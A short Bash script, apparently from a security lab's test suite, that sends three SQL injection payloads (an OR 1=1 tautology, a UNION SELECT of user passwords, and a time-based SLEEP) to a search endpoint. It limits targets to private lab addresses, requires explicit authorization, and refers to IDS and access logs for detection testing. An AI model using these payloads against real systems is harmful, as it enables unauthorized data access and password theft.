#!/usr/bin/env bash
set -euo pipefail

objetivo="${TARGET_URL:-}"
if [[ "${AUTORIZO_LAB:-NO}" != "SI" || -z "$objetivo" ]]; then
  echo 'Uso: AUTORIZO_LAB=SI TARGET_URL=http://IP_VM bash pruebas/ataques/sqli.sh' >&2
  exit 2
fi

if [[ ! "$objetivo" =~ ^https?://(localhost|127\.0\.0\.1|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.) ]]; then
  echo 'ERROR: TARGET_URL debe ser localhost o una IP privada del laboratorio.' >&2
  exit 2
fi

objetivo="${objetivo%/}"
marcas=(
  '1%27%20OR%201%3D1--'
  '1%20UNION%20SELECT%20password%20FROM%20users'
  '1%27%20AND%20SLEEP%285%29--'
)

echo "Ataque SQLi controlado contra $objetivo"
for carga in "${marcas[@]}"; do
  codigo="$(curl --max-time 8 --silent --show-error --output /dev/null \
    --write-out '%{http_code}' "$objetivo/buscar?q=$carga" || true)"
  echo "payload enviado; HTTP=${codigo:-sin_respuesta}"
done

echo 'Revise eve.json, access.log y la API de incidentes según pruebas/guion.md.'
